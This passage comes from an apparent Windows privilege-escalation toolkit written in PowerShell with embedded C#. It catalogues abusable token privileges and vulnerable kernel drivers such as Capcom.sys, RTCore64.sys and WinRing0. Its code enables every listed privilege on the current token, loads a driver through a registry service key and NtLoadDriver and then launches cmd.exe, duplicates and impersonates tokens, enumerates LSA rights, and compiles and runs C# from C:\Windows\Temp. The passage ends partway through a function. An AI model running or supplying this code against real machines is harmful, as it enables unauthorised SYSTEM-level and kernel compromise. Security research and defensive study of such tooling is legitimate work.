Add-Type -AssemblyName System.DirectoryServices

# Debug mode variable
$DEBUG_MODE = $false

# Global data objects
$gCollect = @{
    UserDetails = @{}
    Privileges = @{}
    Groups = @{}
    Credentials = @() 
    OtherData = @{}
}

$privList = @(
    @{name = "SeImpersonatePrivilege"; message = "Can impersonate another user's security context. Often abused in RottenPotato-style attacks."},
    @{name = "SeAssignPrimaryTokenPrivilege"; message = "Allows assigning primary tokens, useful in token theft or paired with SeImpersonatePrivilege for privilege escalation."},
    @{name = "SeBackupPrivilege"; message = "Permits reading any file on the system, even sensitive ones, potentially useful for privilege escalation."},
    @{name = "SeRestorePrivilege"; message = "Allows restoring files, including overwriting important system files for privilege escalation."},
    @{name = "SeCreateTokenPrivilege"; message = "Can create security tokens, potentially to escalate privileges by creating tokens with higher permissions."},
    @{name = "SeLoadDriverPrivilege"; message = "Allows loading drivers, potentially malicious ones, to escalate privileges by compromising the kernel."},
    @{name = "SeTakeOwnershipPrivilege"; message = "Grants the ability to take ownership of files or objects, enabling control over sensitive system resources."},
    @{name = "SeDebugPrivilege"; message = "Permits debugging processes, which can be abused to inject into system processes and escalate privileges."},
    @{name = "SeTcbPrivilege"; message = "Allows the account to act as part of the operating system, granting SYSTEM-level privileges."},
    @{name = "SeSecurityPrivilege"; message = "Allows managing security logs, including clearing them, which could be abused to hide malicious activity."},
    @{name = "SeRemoteShutdownPrivilege"; message = "Permits remotely shutting down the system, potentially useful in denial-of-service attacks."},
    @{name = "SeAuditPrivilege"; message = "Allows generating security audits. Rarely abused, but could be leveraged for specific attacks."},
    @{name = "SeIncreaseQuotaPrivilege"; message = "Permits increasing process memory quotas, potentially exploitable for privilege escalation under specific conditions."},
    @{name = "SeChangeNotifyPrivilege"; message = "Allows bypassing some security checks, such as traversing directories. Typically low-risk."},
    @{name = "SeUndockPrivilege"; message = "Allows undocking the machine. Not generally useful for privilege escalation."},
    @{name = "SeManageVolumePrivilege"; message = "Grants ability to manage disk volumes, which can potentially be abused for mounting sensitive volumes."},
    @{name = "SeProfileSingleProcessPrivilege"; message = "Allows profiling system processes, which may be useful for certain side-channel attacks."},
    @{name = "SeSystemtimePrivilege"; message = "Allows changing the system time, generally not useful for privilege escalation."},
    @{name = "SeTimeZonePrivilege"; message = "Allows changing the time zone, which is typically considered low-risk for privilege escalation."},
    @{name = "SeCreatePagefilePrivilege"; message = "Permits creating a pagefile, generally not exploitable for privilege escalation."},
    @{name = "SeLockMemoryPrivilege"; message = "Allows locking memory, which could potentially be used to interfere with system stability."},
    @{name = "SeIncreaseBasePriorityPrivilege"; message = "Allows increasing the base priority of processes. Rarely useful for privilege escalation."},
    @{name = "SeLoadDriverPrivilege"; message = "Permits loading of drivers, potentially allowing malicious drivers to escalate privileges."},
    @{name = "SeServiceLogonRight"; message = "Allows a user to log on as a service, which can be exploited to run services with higher privileges."},
    @{name = "SeBatchLogonRight"; message = "Allows logging on as a batch job, possibly useful for running malicious scripts with elevated privileges."},
    @{name = "SeNetworkLogonRight"; message = "Allows logging on over the network. Typically not exploitable for privilege escalation on its own."},
    @{name = "SeInteractiveLogonRight"; message = "Permits interactive logon. Rarely abused directly, but could provide access for privilege escalation."},
    @{name = "SeShutdownPrivilege"; message = "Allows shutting down the system, useful for denial-of-service attacks, but not privilege escalation."},
    @{name = "SeSystemProfilePrivilege"; message = "Permits profiling system performance, potentially exploitable in advanced side-channel attacks."},
    @{name = "SeRemoteInteractiveLogonRight"; message = "Allows remote interactive logon. Rarely useful for direct privilege escalation but may facilitate remote access."},
    @{name = "SeTakeOwnershipPrivilege"; message = "Allows taking ownership of files or objects, which can be exploited to gain control over system resources."},
    @{name = "SeTrustedCredManAccessPrivilege"; message = "Allows access to Credential Manager, which could be leveraged to obtain stored credentials for privilege escalation."},
    @{name = "SeRelabelPrivilege"; message = "Permits modifying the integrity levels of objects. Rarely exploited directly but could be useful in certain situations."},
    @{name = "SeSyncAgentPrivilege"; message = "Allows synchronizing directories, typically considered low-risk for privilege escalation."},
    @{name = "SeTimeZonePrivilege"; message = "Allows changing the time zone. Not generally useful for privilege escalation."},
    @{name = "SeUndockPrivilege"; message = "Allows a machine to be undocked. Generally not useful for privilege escalation."},
    @{name = "SeTrustedCredManAccessPrivilege"; message = "Allows trusted access to stored credentials in the Credential Manager."}
)

$vDrivers = @(
    @{ Name = "Capcom.sys"; Message = "Can be used for arbitrary code execution via vulnerable IOCTL calls. High severity." },
    @{ Name = "RTCore64.sys"; Message = "Vulnerable to privilege escalation by enabling arbitrary kernel read/write. High severity." },
    @{ Name = "RTCore32.sys"; Message = "Same as RTCore64, vulnerable to privilege escalation via kernel manipulation. High severity." },
    @{ Name = "AsrDrv103.sys"; Message = "Known for privilege escalation vulnerabilities allowing kernel-level access. High severity." },
    @{ Name = "GDRV.sys"; Message = "Allows arbitrary kernel memory access, can be abused for privilege escalation. High severity." },
    @{ Name = "TVicPort.sys"; Message = "Can be used for port I/O control leading to potential system compromise. Medium severity." },
    @{ Name = "SpeedFan.sys"; Message = "Potential to manipulate hardware monitoring, abused for privilege escalation. Medium severity." },
    @{ Name = "Aida64Driver.sys"; Message = "Exposes IOCTL calls that can lead to arbitrary kernel-level actions. High severity." },
    @{ Name = "Heci.sys"; Message = "Used for Intel ME communication, potential attack vector for privilege escalation. Medium severity." },
    @{ Name = "WinRing0.sys"; Message = "Allows unrestricted hardware access, enabling arbitrary kernel-level code execution. High severity." },
    @{ Name = "WinRing0x64.sys"; Message = "64-bit version of WinRing0, same high-severity privilege escalation risk." },
    @{ Name = "AsusFanControl.sys"; Message = "Could be abused for hardware control manipulation, limited privilege escalation potential. Medium severity." },
    @{ Name = "PROCEXP152.sys"; Message = "Driver for Process Explorer, potential to allow privilege escalation by exploiting weak IOCTL. Medium severity." },
    @{ Name = "DBUtilDrv2.sys"; Message = "Dell driver with known privilege escalation vulnerabilities. High severity." },
    @{ Name = "MateBookManager.sys"; Message = "Vulnerable driver used by Huawei MateBook, exploitable for privilege escalation. Medium severity." },
    @{ Name = "ZemanaAntiMalwareDriver"; Message = "Zemana driver potentially vulnerable to privilege escalation through kernel interactions. Medium severity." }
)


Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Security.Principal;
using System.Collections;
using System.Text;
using System.Diagnostics;

public class TokPriv
{
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_GROUPS_AND_PRIVILEGES
    {
        public uint SidCount;
        public uint SidLength;
        public IntPtr Sids;
        public uint RestrictedSidCount;
        public uint RestrictedSidLength;
        public IntPtr RestrictedSids;
        public uint PrivilegeCount;
        public uint PrivilegeLength;
        public IntPtr Privileges;
        public LUID AuthenticationID;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        uint BufferLength,
        IntPtr PreviousState,
        IntPtr ReturnLength);

    [DllImport("Advapi32.dll", EntryPoint = "LookupPrivilegeNameW", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool LookupPrivilegeName(string SystemName, ref LUID LUID, StringBuilder PrivilegeName, ref uint NameLength);

    [DllImport("Advapi32.dll", EntryPoint = "LookupPrivilegeValueW", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool LookupPrivilegeValue(string SystemName, string Name, out LUID LUID);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle,
    UInt32 DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTokenInformation(IntPtr TokenHandle,
        TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation,
        Int32 TokenInformationLength,
        out Int32 ReturnLength);

    public static UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public static UInt32 TOKEN_QUERY = 0x0008;
    public static List<string> PrintPrivs()
    {
        List<string> privilegeNames = new List<string>();

        IntPtr token;
        bool ret = OpenProcessToken(GetCurrentProcess(), 0x0008 /* TOKEN_QUERY */, out token); // TOKEN_QUERY = 0x0008

        if (!ret)
        {
            throw new InvalidOperationException("Failed to open process token. Ensure you have sufficient privileges.");
        }

        try
        {
            Int32 returnLength;
            ret = GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenGroupsAndPrivileges, IntPtr.Zero, 0, out returnLength);

            if (!ret && Marshal.GetLastWin32Error() != 122) // ERROR_INSUFFICIENT_BUFFER
            {
                throw new InvalidOperationException("Failed to get token information length.");
            }

            IntPtr pGroupsAndPrivilegesInfo = Marshal.AllocHGlobal(returnLength);
            try
            {
                ret = GetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenGroupsAndPrivileges, pGroupsAndPrivilegesInfo, returnLength, out returnLength);
                if (!ret)
                {
                    throw new InvalidOperationException("Failed to get token information.");
                }

                TOKEN_GROUPS_AND_PRIVILEGES groupsAndPrivilegesInfo = (TOKEN_GROUPS_AND_PRIVILEGES)Marshal.PtrToStructure(pGroupsAndPrivilegesInfo, typeof(TOKEN_GROUPS_AND_PRIVILEGES));

                for (int i = 0; i < groupsAndPrivilegesInfo.PrivilegeCount; i++)
                {
                    LUID_AND_ATTRIBUTES privilege = (LUID_AND_ATTRIBUTES)Marshal.PtrToStructure(groupsAndPrivilegesInfo.Privileges + i * Marshal.SizeOf(typeof(LUID_AND_ATTRIBUTES)), typeof(LUID_AND_ATTRIBUTES));
                    StringBuilder name = new StringBuilder(50);
                    uint cchName = 50;
                    ret = LookupPrivilegeName(null, ref privilege.Luid, name, ref cchName);
                    if (ret)
                    {
                        privilegeNames.Add(name.ToString());
                    }
                }
            }
            finally
            {
                Marshal.FreeHGlobal(pGroupsAndPrivilegesInfo);
            }
        }
        finally
        {
            CloseHandle(token);
        }

        return privilegeNames;
    }

    public static void AddPrivs(params string[] privileges)
    {
        bool ret = false;
        IntPtr token;
        ret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out token);
        if (!ret)
        {
            Console.WriteLine("Failed to open process token with error: " + Marshal.GetLastWin32Error());
            return;
        }

        foreach (string priv in privileges)
        {
            LUID luid = new LUID();
            ret = LookupPrivilegeValue(null, priv, out luid);
            if (!ret)
            {
                Console.WriteLine("Failed to look up privilege: {1} with error code: {0} ", Marshal.GetLastWin32Error(), priv);
                continue;
            }

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Privileges = new LUID_AND_ATTRIBUTES[1];
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = 0x00000002; // SE_PRIVILEGE_ENABLED

            ret = AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            if (!ret || Marshal.GetLastWin32Error() != 0)
            {
                Console.WriteLine("Failed to adjust privilege: {1} with error code: {0}", Marshal.GetLastWin32Error(), priv);
            }
            else
            {
                Console.WriteLine("Successfully added privilege: {0}", priv);
            }
        }
    }
}

public class DriverLoader
{
    [DllImport("ntdll.dll")]
    public static extern int NtLoadDriver(IntPtr DriverServiceName);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RegCreateKeyEx(IntPtr hKey, string lpSubKey, uint Reserved, string lpClass, uint dwOptions, uint samDesired, IntPtr lpSecurityAttributes, out IntPtr phkResult, out uint lpdwDisposition);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int RegSetValueEx(IntPtr hKey, string lpValueName, uint Reserved, uint dwType, byte[] lpData, uint cbData);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern void RegCloseKey(IntPtr hKey);

    public static void LoadDriver(string registryPath, string driverPath)
    {
        IntPtr hKey;
        uint dwDisposition;
        
        // Create the registry key for the driver
        bool result = RegCreateKeyEx((IntPtr)0x80000002, registryPath, 0, null, 0, 0xF003F, IntPtr.Zero, out hKey, out dwDisposition);
        if (!result)
        {
            // Retrieve and display the error code
            int errorCode = Marshal.GetLastWin32Error();
            Console.WriteLine("Failed to create registry key. Error Code: {errorCode}");
            return;
        }
        
        // Set the ImagePath value
        byte[] driverPathBytes = System.Text.Encoding.Unicode.GetBytes(driverPath);
        RegSetValueEx(hKey, "ImagePath", 0, 1, driverPathBytes, (uint)driverPathBytes.Length);
        
        // Set other required values
        RegSetValueEx(hKey, "Type", 0, 4, BitConverter.GetBytes(1), 4);
        RegSetValueEx(hKey, "ErrorControl", 0, 4, BitConverter.GetBytes(1), 4);
        RegSetValueEx(hKey, "Start", 0, 4, BitConverter.GetBytes(3), 4);
        
        RegCloseKey(hKey);
        
        // Load the driver
        IntPtr driverServiceName = Marshal.StringToHGlobalUni(registryPath);
        int status = NtLoadDriver(driverServiceName);
        Marshal.FreeHGlobal(driverServiceName);
        
        if (status != 0)
        {
            Console.WriteLine("Failed to load driver.");
        }
        else
        {
            Console.WriteLine("Driver loaded successfully.");
            // Execute cmd.exe as a test
            System.Diagnostics.Process.Start("cmd.exe");
        }
    }
}

public class TokenImp {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public extern static bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public extern static IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public extern static bool DuplicateToken(IntPtr existingTokenHandle, int impersonationLevel, out IntPtr duplicateTokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public extern static bool ImpersonateLoggedOnUser(IntPtr hToken);

    public const uint TOKEN_DUPLICATE = 0x0002;
    public const int SecurityImpersonation = 2;

    public static bool ImpSys() {
        IntPtr currentTokenHandle = IntPtr.Zero;
        IntPtr duplicateTokenHandle = IntPtr.Zero;

        // Get the current process token
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, out currentTokenHandle)) {
            return false;
        }

        // Duplicate the token
        if (!DuplicateToken(currentTokenHandle, SecurityImpersonation, out duplicateTokenHandle)) {
            return false;
        }

        // Impersonate the duplicated token
        if (!ImpersonateLoggedOnUser(duplicateTokenHandle)) {
            return false;
        }

        return true;
    }
}

public class SetTokenPriv
{
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
    ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
    [DllImport("advapi32.dll", SetLastError = true)]
    internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct TokPriv1Luid
    {
        public int Count;
        public long Luid;
        public int Attr;
    }
    internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
    internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
    internal const int TOKEN_QUERY = 0x00000008;
    internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public static void EnablePrivilege()
    {
        bool retVal;
        TokPriv1Luid tp;
        IntPtr hproc = new IntPtr();
        hproc = Process.GetCurrentProcess().Handle;
        IntPtr htok = IntPtr.Zero;

        List<string> privs = new List<string>() {  "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
        "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
        "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
        "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SePrivileges", "SeIncreaseBasePriorityPrivilege",
        "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege",
        "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege",
        "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege",
        "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",
        "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege",
        "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
        "SeUndockPrivilege", "SeUnsolicitedInputPrivilege", "SeDelegateSessionUserImpersonatePrivilege" };


        

        retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
        tp.Count = 1;
        tp.Luid = 0;
        tp.Attr = SE_PRIVILEGE_ENABLED;

        foreach (var priv in privs)
        {
            retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);
            retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              
        }
    }
}  

public class PrivilegeFetcher
{
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool LookupPrivilegeName(string lpSystemName, ref LUID lpLuid, System.Text.StringBuilder lpName, ref int cchName);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    const int TokenPrivileges = 3; // TokenPrivileges enum
    const uint SE_PRIVILEGE_ENABLED = 0x00000002;

    public static void FetchPrivileges()
    {
        IntPtr processHandle = GetCurrentProcess();
        IntPtr tokenHandle;

        if (OpenProcessToken(processHandle, 0x0008, out tokenHandle)) // TOKEN_QUERY
        {
            // Get token privileges
            int tokenInfoLength = 0;
            GetTokenInformation(tokenHandle, TokenPrivileges, IntPtr.Zero, 0, out tokenInfoLength);

            IntPtr tokenInfo = Marshal.AllocHGlobal(tokenInfoLength);
            if (GetTokenInformation(tokenHandle, TokenPrivileges, tokenInfo, tokenInfoLength, out tokenInfoLength))
            {
                // First, read the privilege count
                uint privilegeCount = (uint)Marshal.ReadInt32(tokenInfo);

                // Offset to start reading privileges
                IntPtr privilegesPtr = new IntPtr(tokenInfo.ToInt64() + sizeof(uint));

                for (int i = 0; i < privilegeCount; i++)
                {
                    LUID_AND_ATTRIBUTES luidAndAttributes = (LUID_AND_ATTRIBUTES)Marshal.PtrToStructure(privilegesPtr, typeof(LUID_AND_ATTRIBUTES));
                    LUID luid = luidAndAttributes.Luid;

                    // Lookup privilege name
                    System.Text.StringBuilder privilegeName = new System.Text.StringBuilder(256);
                    int nameLength = privilegeName.Capacity;
                    if (LookupPrivilegeName(null, ref luid, privilegeName, ref nameLength))
                    {
                        string name = privilegeName.ToString();
                        bool isEnabled = (luidAndAttributes.Attributes & SE_PRIVILEGE_ENABLED) == SE_PRIVILEGE_ENABLED;
                        Console.WriteLine("Privilege: {0}, Enabled: {1}", name, isEnabled);
                    }
                    else
                    {
                        Console.WriteLine("Failed to lookup privilege name.");
                    }

                    // Move the pointer to the next privilege
                    privilegesPtr = new IntPtr(privilegesPtr.ToInt64() + Marshal.SizeOf(typeof(LUID_AND_ATTRIBUTES)));
                }
            }
            Marshal.FreeHGlobal(tokenInfo);
        }
        else
        {
            Console.WriteLine("Failed to open process token.");
        }
    }
}

public class PrivilegeFetcher2
{
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int LsaOpenPolicy(IntPtr systemName, ref LSA_OBJECT_ATTRIBUTES objAttributes, int desiredAccess, out IntPtr policyHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int LsaEnumerateAccountRights(IntPtr policyHandle, IntPtr accountSid, out IntPtr userRights, out int countOfRights);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int LsaClose(IntPtr policyHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupAccountName(string lpSystemName, string lpAccountName, IntPtr Sid, ref int cbSid, StringBuilder ReferencedDomainName, ref int cchReferencedDomainName, out int peUse);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int LsaNtStatusToWinError(int status);

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [DllImport("netapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int NetLocalGroupEnum(
        string serverName, 
        int level, 
        out IntPtr bufPtr, 
        int prefMaxLen, 
        out int totalEntries, 
        out int totalBytesNeeded, 
        out IntPtr resumeHandle
    );

    [DllImport("netapi32.dll", SetLastError = true)]
    public static extern int NetApiBufferFree(IntPtr buffer);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct LOCALGROUP_INFO_0
    {
        public IntPtr grpi0_name;
    }

    public static List<string> GetGroupPrivileges(string groupName)
    {
        var output = new List<string>();
        IntPtr policyHandle;

        // Set LSA Object Attributes to zero
        LSA_OBJECT_ATTRIBUTES lsaAttributes = new LSA_OBJECT_ATTRIBUTES();
        lsaAttributes.Length = Marshal.SizeOf(lsaAttributes);

        int result = LsaOpenPolicy(IntPtr.Zero, ref lsaAttributes, 0x00000800, out policyHandle);
        if (result != 0)
        {
            output.Add("[-] Failed to open LSA policy. Error Code: " + LsaNtStatusToWinError(result));
            return output;
        }

        IntPtr sid = GetGroupSid(groupName);
        if (sid == IntPtr.Zero)
        {
            output.Add("[-] Failed to retrieve SID for group: " + groupName);
            return output;
        }

        IntPtr userRights;
        int countOfRights;
        result = LsaEnumerateAccountRights(policyHandle, sid, out userRights, out countOfRights);

        if (result != 0)
        {
            output.Add("[-] Failed to enumerate account rights. Error Code: " + LsaNtStatusToWinError(result));
        }
        else if (userRights == IntPtr.Zero || countOfRights == 0)
        {
            output.Add("[-] No privileges found for this group.");
        }
        else
        {
            IntPtr iter = userRights;
            for (int i = 0; i < countOfRights; i++)
            {
                try
                {
                    string privilege = Marshal.PtrToStringUni(Marshal.ReadIntPtr(iter));
                    output.Add("  - Privilege: " + privilege);
                    iter = IntPtr.Add(iter, IntPtr.Size);
                }
                catch (AccessViolationException)
                {
                    output.Add("[-] Failed to read privilege from memory.");
                    break;
                }
            }
        }

        LsaClose(policyHandle);
        return output;
    }

    public static List<string> GetLocalGroups()
    {
        var groups = new List<string>();
        IntPtr bufPtr = IntPtr.Zero;
        IntPtr resumeHandle = IntPtr.Zero;
        int totalEntries;
        int totalBytesNeeded;

        int result = NetLocalGroupEnum(
            null, // local machine
            0,    // information level 0 (group names)
            out bufPtr, 
            -1,   // unlimited buffer size
            out totalEntries, 
            out totalBytesNeeded, 
            out resumeHandle
        );

        if (result == 0 && bufPtr != IntPtr.Zero)
        {
            try
            {
                int structSize = Marshal.SizeOf(typeof(LOCALGROUP_INFO_0));
                for (int i = 0; i < totalEntries; i++)
                {
                    IntPtr current = IntPtr.Add(bufPtr, i * structSize);
                    LOCALGROUP_INFO_0 groupInfo = (LOCALGROUP_INFO_0)Marshal.PtrToStructure(current, typeof(LOCALGROUP_INFO_0));

                    string groupName = Marshal.PtrToStringAuto(groupInfo.grpi0_name);
                    groups.Add(groupName);
                }
            }
            finally
            {
                NetApiBufferFree(bufPtr);
            }
        }
        else
        {
            groups.Add("[-] Failed to retrieve local groups. Error Code: {result}");
        }

        return groups;
    }

    public static IntPtr GetGroupSid(string groupName)
    {
        int sidSize = 0;
        int domainNameSize = 0;
        int peUse;

        // Call with null values to get the required buffer sizes
        LookupAccountName(null, groupName, IntPtr.Zero, ref sidSize, null, ref domainNameSize, out peUse);

        // Allocate buffers
        IntPtr sid = Marshal.AllocHGlobal(sidSize);
        StringBuilder domainName = new StringBuilder(domainNameSize);

        bool success = LookupAccountName(null, groupName, sid, ref sidSize, domainName, ref domainNameSize, out peUse);

        if (!success)
        {
            Marshal.FreeHGlobal(sid);
            return IntPtr.Zero;
        }

        return sid;
    }
}

public class Win32 {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();
}
"@

function compileOTF {
    # Compile and load on-the-fly - used mostly for testing and demo purposes
    $tempPath = "C:\Windows\Temp"
    $driverSourcePath = Join-Path -Path $tempPath -ChildPath "HelloWorld.cs"
    $compiledDriverPath = Join-Path -Path $tempPath -ChildPath "HelloWorld.exe"
    $driverSource = @"
using System; using System.Runtime.InteropServices; public class HelloWorld { [DllImport("user32.dll")] public static extern int MessageBox(int hWnd, string text, string caption, int type); public static void Main() { MessageBox(0, System.Security.Principal.WindowsIdentity.GetCurrent().Name, "Driver runs as User:", 0);} } 
"@
    Set-Content -Path $driverSourcePath -Value $driverSource

    # Compile the C# code using csc.exe
    $cscPath = "$env:windir\Microsoft.NET\Framework\v4.0.30319\csc.exe"
    & $cscPath -out:$compiledDriverPath $driverSourcePath

    if (Test-Path $compiledDriverPath) {
        Write-Output "[+] Driver compiled successfully. Attempting to load..."
        Start-Process -FilePath $compiledDriverPath
    } else {
        Write-Output "[-] Driver compilation failed."
    }
}

function Get-LocalizedUserMapping {
    $userMappings = @{
        'administrators' = 'S-1-5-32-544'
        'nt authority\system' = 'S-1-5-18'
        'users' = 'S-1-5-32-545'
        'authenticated users' = 'S-1-5-11'
        'nt authority\network service' = 'S-1-5-20'
        'everyone' = 'S-1-1-0'
        'nt authority\local service' = 'S-1-5-19'
    }    

    $localizedUser = @{}

    foreach ($englishName in $userMappings.Keys) {
        # Get the SID
        $sid = $userMappings[$englishName]

        # Get the localized name for the current system language
        $localizedName = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value.ToLower()

        # Check if the English name contains a backslash
        if ($englishName -notmatch '\\') {
            # Remove any prefix using regex (e.g., ".*\")
            $localizedName = $localizedName -replace '.*\\', ''
        }

        # Populate the hashtable with all mappings
        $localizedUser[$englishName] = @{
            SID = $sid
            LocalizedName = $localizedName
        }

        $localizedUser[$localizedName] = @{
            SID = $sid
            EnglishName = $englishName
        }

        $localizedUser[$sid] = @{
            SID = $sid
            LocalizedName = $localizedName
            EnglishName = $englishName
        }
    }

    return $localizedUser
}

function splitStringToColumns {
    param (
        [string]$inputString
    )

    # Initialize an array to hold the columns as strings
    $columns = @()

    # Split the input by newline to handle multiple lines
    $inputLines = $inputString -split "`n"

    # Process each line in the input
    foreach ($line in $inputLines) {
        # Trim the line to remove leading/trailing whitespace
        $line = $line.Trim()

        # Skip empty lines
        if (-not [string]::IsNullOrWhiteSpace($line)) {
            # Split the line into parts based on whitespace (one or more spaces or tabs)
            $parts = $line -split '\s+'

            # Add parts to the corresponding column index
            for ($i = 0; $i -lt $parts.Length; $i++) {
                if ($columns.Count -le $i) {
                    $columns += ""  # Dynamically add new columns
                }
                $columns[$i] += $parts[$i] + "`n"  # Append the part with a newline
            }
        }
    }
    return $columns
}

function runSubprocess {
    param(
        [string]$filename,
        [string]$argList
    )
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName =  $filename
    $processInfo.Arguments = $argList
    $processInfo.RedirectStandardOutput = $true
    $processInfo.UseShellExecute = $false
    $processInfo.CreateNoWindow = $true

    # Create the process
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $processInfo

    # Start the process
    $process.Start() | Out-Null

    # Read the output
    $output = $process.StandardOutput.ReadToEnd()
    
    # Wait for the process to exit
    $process.WaitForExit()

    # Output the result
    return $output
}

function Get-LocalAdminGroupName {
    try {
